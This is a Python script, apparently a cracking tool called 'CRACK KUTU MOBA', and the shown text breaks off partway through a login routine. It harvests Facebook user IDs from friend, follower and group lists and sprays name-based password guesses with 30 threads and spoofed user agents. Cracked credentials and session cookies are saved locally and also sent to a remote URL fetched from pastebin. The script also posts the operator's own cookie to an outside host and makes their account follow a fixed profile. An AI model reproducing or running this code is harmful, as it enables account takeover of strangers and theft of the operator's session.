#!/bin/user/python

from stdiomask import getpass
import hashlib
import os,sys
clear = lambda: os.system('cls')

import time
from rich import print as cetak
from rich.panel import Panel as nel
import rich,datetime
from rich.console import Console
from rich.panel import Panel
import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")
import requests,bs4,json,os,sys,random,datetime,time,re
from rich import print as cetak
from rich.panel import Panel as nel
import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
KhamdihiGanteng = [ M,H,K,O,N ] # warna janda x

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA YANG UDAH GAK PERAWAN :V
J = '\033[38;2;255;127;0;1m' # ORANGE
KhamdihiGanteng = [ P,M,H,K,B,U,O,N ] # warna janda x

hour = datetime.datetime.now().hour
#--> Pengkondisian Jam Untuk Salam Harian
if hour < 4:
  hhl = f"Selamat Dini Hari"
elif 4 <= hour < 10:
  hhl = f"Pagi "
elif 10 <= hour < 15:
  hhl = "siang "
elif 15 <= hour < 17:
  hhl = f"Sore "
elif 17 <= hour < 18:
  hhl = f"Sore "
else:
  hhl = f"Malam "
wel=f'{hhl}'

def ngiseng():
    time.sleep(2)
    print(" ")
    asbak = input(f' %s╰───▶ %s[%s ?? %s] %sKembali Ke Menu Utama : %s'%(M,N,O,N,H,K))
    if asbak in ["y", "Y"]:
      Login()
    elif asbak in ["n", "N"]:
        print(" ")
        os.system("exit")
    else:
        print(" ")
        os.system("clear")
        print(' %s  ╰───▶ %sAnda Tidak Memasukan Perintah Yang Benar '%(K,M))
        time.sleep(3)
        ngiseng()


def klambi():
    Console(width=66, style="\t\t\tbold hot_pink2").print(nel("""\n[bold red]°[bold yellow] °[bold green] °

                    ──▄▀▀▀▄───────────────
[bold red]           https://github.com/KutuMobaa/Lihat_deskripsi
[bold green]                    ──█───█───────────────
                    ─███████─────────▄▀▀▄─
                    ░██─▀─██░░█▀█▀▀▀▀█░░█░
                    ░███▄███░░▀░▀░░░░░▀▀░░

[bold yellow]Author        [bold blue]▶[bold yellow] Ardia Trista
[bold yellow]YouTube       [bold blue]▶[bold yellow] https://youtube.com/@KutuMoba
[bold yellow]Grub Telegram [bold blue]▶[bold yellow] https://t.me/kutu_Moba57 """, title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 5.7 [bold green]<[bold yellow]<[bold red]<"))
    print(" ")
    Console(width=66, style="\t\t\tbold green").print(nel("[bold red]•> [bold blue]Untuk Mendapatkan Password, Silahkan Akses Link Di Atas [bold red]<•"))
    print("="*66)
def clear():
    os.system("clear")

def main():
    clear()
    print("MAIN MENU")
    print("---------")
    print(" ")
    print("1 - Register")
    print("2 - Login")
    print(" ")
    while True:
        print()
        userChoice = input("Choose An Option: ")
        if userChoice in ['1', '2']:
            break
    if userChoice == '1':
        Register()
    else:
        kursi()

def Register():
    clear()
    print("REGISTER")
    print("--------")
    print()
    while True:
        userName = input("Enter Your Name: ").title()
        if userName != '':
            break
    userName = sanitizeName(userName)
    if userAlreadyExist(userName):
        displayUserAlreadyExistMessage()
    else:
        while True:
            userPassword = getpass("Enter Your Password: ")
            if userPassword != '':
                break
        while True:
            confirmPassword = getpass("Confirm Your Password: ")
            if confirmPassword == userPassword:
                break
            else:
                print("Passwords Don't Match")
                print()
        if userAlreadyExist(userName, userPassword):
            while True:
                print()
                error = input("You Are Already Registered.\n\nPress (T) To Try Again:\nPress (L) To Login: ").lower()
                if error == 't':
                    Register()
                    break
                elif error == 'l':
                    kursi()
                    break
        addUserInfo([userName, hash_password(userPassword)])

        print(" ")
        print("Registered!")

def kursi():
    clear()
    klambi()
    time.sleep(2)
    print(" ")
    usersInfo = {}
    with open('userInfo.txt', 'r') as file:
        for line in file:
            line = line.split()
            usersInfo.update({line[0]: line[1]})

    while True:
        userName = input("  %s╰───▶ %sMasukan Username Author %s ═▶ %s"%(J,H,K,J)).title()
        userName = sanitizeName(userName)
        if userName not in usersInfo:
            print("\n  %s[%s ! %s] %sNama Tidak Di Kenal"%(O,M,O,K))
            print(" ")
        else:
            break
    while True:
        userPassword = getpass("\n  %s╰───▶ %sMasukan Password %s ═▶ %s"%(J,H,K,J))
        if not check_password_hash(userPassword, usersInfo[userName]):
            print("\n  %s[%s ! %s] %sPassword Anda Salah"%(O,M,O,K))
            print(" ")
        else:
            break
    time.sleep(2)
    os.system("clear")
    print('\x1b[1;94m')
    Console(width=55, style="\t\t\tbold green").print(nel("\t[bold yellow]Welcome To The World Of Hacking "))
    print('\x1b[0m')
    time.sleep(2)
    os.system("clear")

def addUserInfo(userInfo: list):
    with open('userInfo.txt', 'a') as file:
        for info in userInfo:
            file.write(info)
            file.write(' ')
        file.write('\n')

def userAlreadyExist(userName, userPassword=None):
    if userPassword == None:
        with open('userInfo.txt', 'r') as file:
            for line in file:
                line = line.split()
                if line[0] == userName:
                    return True
        return False
    else:
        userPassword = hash_password(userPassword)
        usersInfo = {}
        with open('userInfo.txt', 'r') as file:
            for line in file:
                line = line.split()
                if line[0] == userName and line[1] == userPassword:
                    usersInfo.update({line[0]: line[1]})
        if usersInfo == {}:
            return False
        return usersInfo[userName] == userPassword

def displayUserAlreadyExistMessage():
    while True:
        print(" ")
        error = input("You Are Already Registered.\n\nPress (T) To Try Again:\nPress (L) To Login: ").lower()
        if error == 't':
            Register()
            break
        elif error == 'l':
            kursi()
            break

def sanitizeName(userName):
    userName = userName.split()
    userName = '-'.join(userName)
    return userName

def hash_password(password):
    return hashlib.sha256(str.encode(password)).hexdigest()

def check_password_hash(password, hash):
    return hash_password(password) == hash


class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt");os.remove(".tok.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""{H}
    _ ___    _ _____ _   _
   | |/ / | | |_   _| | | |
   | ' /| | | | | | | | | |                                          | . \| |_| | | | | |_| |
   |_|\_ \___/  |_|  \___/
      """)
        print(f"""
       |  \/  |/ _ \| __ )  / \ 
       | |\/| | | | |  _ \ / _ \                                         | |  | | |_| | |_) / ___ \ 
       |_|  |_|\___/|____/_/   \_\ 
        
{O} Author           {K} Ardia Trista
{H} Youtube          {O} https://youtube.com/@KutuMoba
{K} Telegram         {H} https://t.me/kutu_Moba57 
      """)

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        print("")
        try:
            kursi()
            cok = input(' %s╰───▶ %s[%s ! %s] %sMasukkan Cookie Anda : %s'%(M,N,O,N,H,K))
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: anda sedang menggunakan mode free facebook")
                print("[-] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                self.ubah_bahasa({"cookie": cok})
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[-] silahkan masukan ulang cookie nya dengan mengetik python run.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie yang anda masukan invalid");time.sleep(2);self.login_cokie()
            else:
                print("\n[-] Mohon tunggu sebentar...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('.cok.txt', 'w').write(cok);open('.tok.txt', 'w').write(f"{nama}|{user}")

#batas
                
                print('\x1b[1;96m')
                print(f" [✓] selamat datang {nama} di CRACK KUTU MOBA");self.ikuti({"cookie": cok});self.datas(nama, cok)
                
                print(" ")
                time.sleep(1)
                print('\x1b[1;92m')
                time.sleep(1)

                exit("\n [!] Silahkan Login Ulang Script Untuk Akses Premium \n")
                


        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open(".cok.txt", "r").read()}
            nama, user = open(".tok.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        self.jnckk()
        print(f"""
{wel}{O}{nama}{N}\n""")
        time.sleep(2)
        print(f"""
{K}[+] Pengguna         : {O}{nama}{N}
{K}[+] Status Script    : {H}PREMIUM{N}
{K}[+] ID Facebook Anda : {O}{user}{H}\n""")
        print(" ")
        cetak(nel('\t• ============================================ •'))
        print("""
  %s{%s01%s} %s exit ( save )
  %s{%s02%s} %s crack frinds
  %s{%s03%s} %s crack followers
  %s{%s04%s} %s crack member grup
  %s{%s05%s} %s check crack results
  %s{%s06%s} %s get proxy server list
  %s{%s00%s} %s logout
"""%(
N,H,N,K,
N,H,N,O,
N,H,N,H,
N,H,N,N,
N,H,N,K,
N,H,N,O,
N,H,N,H,
))
        cetak(nel('\t• ============================================ •'))
        print(" ")
        ykh = input(f' %s╚═ %s[%s ++ %s] %sKutu Moba %s===>>> : %s'%(O,H,M,H,K,N,K))
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("\n COOKIE dan LICENSE aman \n")
        elif ykh in ["2", "02"]:
            print('\x1b[0m')
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, silahkan logout dan beralih akun ");time.sleep(3);self.menu()
                    else:
                        print("[!] to stop press CTRL then press Z on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, silahkan logout dan beralih akun ");time.sleep(3);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press Z on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, silahkan logout dan beralih akun ");time.sleep(3);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press Z on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, silahkan logout dan beralih akun ");time.sleep(3);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press Z on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f' %s╚═ %s[%s ++ %s] %sKutu Moba %s===>>> : %s'%(O,H,M,H,K,N,K))
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"???"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"???"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} ... ID ");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass
#https://pastebin.com/raw/mi4nGb0K
#https://pastebin.com/raw/FRn3fBGN
    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"???"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"???"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} ... ID ");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"???"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"???"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} ... ID ");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print('\x1b[1;96m')
        print("    [ select metode ]")
        print('\x1b[0m')
        print("""

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
\n"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f' %s╚═ %s[%s ++ %s] %sKutu Moba %s===>>> : %s'%(O,H,M,H,K,N,K))
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print('\x1b[1;96m')
        print("    [ select password ]")
        print('\x1b[0m')
        print("""

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
\n"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f' %s╚═ %s[%s ++ %s] %sKutu Moba %s===>>> : %s'%(O,H,M,H,K,N,K))
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}��{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    os.system("clear")
                    self.logoo()
                    print('\x1b[1;91m')
                    cetak(nel("""\t
      -----------------------------------------------------
      PROSES CRACK FB, PASTIKAN INTERNET ANDA TANPA KENDALA
      -----------------------------------------------------\n"""))
                    print(" ")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("???")[0], pwek)
                        print(" ")
                        exit('\n\n %s╰───▶ %s[%s✓%s]  %sProses Cracking %sSelesai '%(M,N,O,N,H,K))
                        
                elif "acy" in xx:
                    os.system("clear")
                    self.logoo()
                    print('\x1b[1;91m')
                    cetak(nel("""\t
     -----------------------------------------------------
     PROSES CRACK FB, PASTIKAN INTERNET ANDA TANPA KENDALA
     -----------------------------------------------------\n"""))
                    print(" ")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("???")[0], pwek)
                        print(" ")
                        exit('\n\n %s╰───▶ %s[%s✓%s]  %sProses Cracking %sSelesai '%(M,N,O,N,H,K))
                        
                elif "dat" in xx:
                    os.system("clear")
                    self.logoo()
                    print('\x1b[1;91m')
                    cetak(nel("""\t
     -----------------------------------------------------
     PROSES CRACK FB, PASTIKAN INTERNET ANDA TANPA KENDALA
     -----------------------------------------------------\n"""))
                    print(" ")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("???")[0], pwek)
                        print(" ")
                        exit('\n\n %s╰───▶ %s[%s✓%s]  %sProses Cracking %sSelesai '%(M,N,O,N,H,K))
                        
                else:
                    continue

    def carckk(self, kntd):
        os.system("clear")
        self.logoo()
        print('\x1b[1;91m')
        cetak(nel("""\t
     -----------------------------------------------------
     PROSES CRACK FB, PASTIKAN INTERNET ANDA TANPA KENDALA
     -----------------------------------------------------\n"""))
        print(" ")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    uid, nama = user.split("???")[0], user.split("???")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:
                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        if "iya" in self.iya:
                            for x in self.pasw:
                                pwx.append(x)
                        if "api" in kntd:
                            bool.submit(self.apiiiiii, uid, pwx)
                        elif "acy" in kntd:
                            bool.submit(self.regguler, uid, pwx)
                        elif "dat" in kntd:
                            bool.submit(self.validate, uid, pwx)
                        else:bool.submit(self.regguler, uid, pwx)
                    except:pass
            print(" ")
            exit('\n\n %s╰───▶ %s[%s✓%s]  %sProses Cracking %sSelesai '%(M,N,O,N,H,K))
            

    def ua_acy(self):
        versi_android = str(random.randint(4,12))+".0.0"
        versi_app = random.randint(100000000,900000000)
        versi_chrome = str(random.randint(200,299))+".0.0."+str(random.randint(1,29))+"."+str(random.randint(40,200))
        versi_fbpn = random.choice(["com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.katana","com.facebook.mlite"])
        vivo1 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{versi_chrome};FBPN/{versi_fbpn};FBLC/en_US;FBBV/{versi_app};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
        vivo2 = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,12))}; vivo 1920 Build/RP1A.{str(random.randint(111111,299999))}.012)"
        rmx = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,13))}; RMX3572 Build/TP1A.{str(random.randint(200000,900000))}.001)"
        vivo_main = str(random.choice([vivo1, vivo2, rmx]))
        return vivo_main

    def ua_api(self):
        az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
        builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
        chrome3 = str(random.randint(100, 300))
        chrome4 = str(random.randint(1000, 9000))
        ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
        return ngentod

    def apiiiiii(self, username, pasw):
        prog.update(des, description=f"[{O} √ CRACK {N}] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_api()
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r[ {H}OK{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r[ {K}CP{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
                    prog.update(des, description=f"[ [bold red]! spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]! spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

    def regguler(self, username, pasw):
        prog.update(des, description=f"[{O} √ CRACK {N}] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_acy()
                link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
                data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
